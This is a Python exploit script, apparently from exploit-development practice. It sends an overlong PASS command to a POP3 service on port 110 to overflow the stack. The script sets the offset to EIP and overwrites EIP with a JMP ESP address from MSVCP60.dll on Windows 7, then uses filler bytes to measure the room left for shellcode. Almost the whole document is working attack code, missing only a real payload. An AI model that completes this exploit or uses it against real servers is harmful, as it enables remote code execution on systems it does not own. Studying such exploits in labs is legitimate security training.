#!/usr/bin/python 
import struct
import socket
 

 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 

# Here we are just verifying that calculated our distance to EIP properly.
# If this script works than EIP should be overwritten with 42424242
# and ESP should be filled with Cs (43s) 
 
 
 
distance_to_eip = '\x41' * 4654

# Found a JMP ESP in MSVCP60.dll on Windows 7 Version 6.1.7601
eip_overwrite = struct.pack('<L', 0x740B2C74)			# 740B2C74   FFE4             JMP ESP



# Now let's test for the length of shellcode that this exploit can handle
shellcode = "C" * 1000

# When I did this I found (0295A128) with 43434343 at the top of ESP, and I found that my 43s truncated at 0295A2D0
# Now I'll subtract 0295A128 (top of ESP) from 0295A2D0 (end of shellcode)
# So  0295A2D0 - 0295A128 = 1A8 which is: 424 bytes of space for shellcode


buffer = distance_to_eip + eip_overwrite + shellcode



try:
    print "\nSending the exploit..."
    s.connect(('127.0.0.1',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"